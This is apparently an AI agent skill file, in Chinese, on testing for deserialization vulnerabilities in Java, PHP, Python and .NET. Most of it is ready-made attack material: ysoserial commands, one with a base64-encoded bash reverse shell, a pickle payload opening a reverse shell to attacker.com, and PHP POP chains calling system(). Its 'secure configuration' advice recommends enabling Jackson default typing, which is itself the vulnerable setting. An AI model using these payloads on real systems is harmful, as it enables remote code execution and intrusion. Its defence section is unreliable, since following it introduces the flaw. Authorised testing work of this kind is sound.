---
name: deserialization-testing
description: 反序列化漏洞测试的专业技能和方法论
version: 1.0.0
---

# 反序列化漏洞测试

## 概述

反序列化漏洞是一种利用应用程序反序列化不可信数据导致的漏洞，可能导致远程代码执行、拒绝服务等。本技能提供反序列化漏洞的检测、利用和防护方法。

## 漏洞原理

应用程序将序列化的数据反序列化为对象时，如果数据来源不可信，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。

## 常见格式

### Java

**常见库：**
- Java原生序列化
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**常见函数：**
- unserialize()
- json_decode()

### Python

**常见模块：**
- pickle
- yaml
- json

### .NET

**常见类：**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## 测试方法

### 1. 识别序列化数据

**Java序列化特征：**
```
AC ED 00 05 (十六进制)
rO0 (Base64)
```

**PHP序列化特征：**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle特征：**
```
\x80\x03
```

### 2. 检测反序列化点

**常见位置：**
- Cookie值
- Session数据
- API参数
- 文件上传
- 缓存数据
- 消息队列

### 3. Java反序列化

**Apache Commons Collections利用：**
```java
// 使用ysoserial生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**常见Gadget链：**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP反序列化

**基础测试：**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**魔术方法利用：**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**基础测试：**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## 利用技术

### Java RCE

**使用ysoserial：**
```bash
# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64编码
base64 -w 0 payload.bin
```

**手动构造：**
```java
// 使用Gadget链构造恶意对象
// 参考ysoserial源码
```

### PHP RCE

**利用POP链：**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE：**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## 绕过技术

### 编码绕过

**Base64编码：**
```
原始: rO0ABXNy...
编码: ck8wQUJYTnk...
```

**URL编码：**
```
%72%4F%00%AB...
```

### 过滤器绕过

**使用不同Gadget链：**
- 如果CommonsCollections被过滤，尝试Spring
- 如果某个版本被过滤，尝试其他版本

### 类名混淆

**使用反射：**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## 工具使用

### ysoserial

```bash
# 列出可用Gadget
java -jar ysoserial.jar

# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# 生成Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# 列出可用Gadget
./phpggc -l

# 生成Payload
./phpggc Monolog/RCE1 system id

# 生成编码Payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. 拦截包含序列化数据的请求
2. 使用插件生成Payload
3. 替换原始数据
4. 观察响应

## 验证和报告

### 验证步骤

1. 确认可以控制序列化数据
2. 验证反序列化触发代码执行
3. 评估影响（RCE、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和序列化数据格式
- 使用的Gadget链或利用方式
- 完整的利用步骤和PoC
- 修复建议（输入验证、使用安全序列化等）

## 防护措施

### 推荐方案

1. **避免反序列化不可信数据**
   - 使用JSON替代
   - 使用安全的序列化格式

2. **输入验证**
   ```java
   // 白名单验证类名
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // 验证类名
       // ...
   }
   ```

3. **使用安全配置**
   ```java
   // Jackson配置
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **类加载器隔离**
   - 使用自定义ClassLoader
   - 限制可加载的类

5. **监控和日志**
   - 记录反序列化操作
   - 监控异常行为

## 注意事项

- 仅在授权测试环境中进行
- 注意不同版本库的Gadget链差异
- 测试时注意Payload大小限制
- 了解目标应用的依赖库版本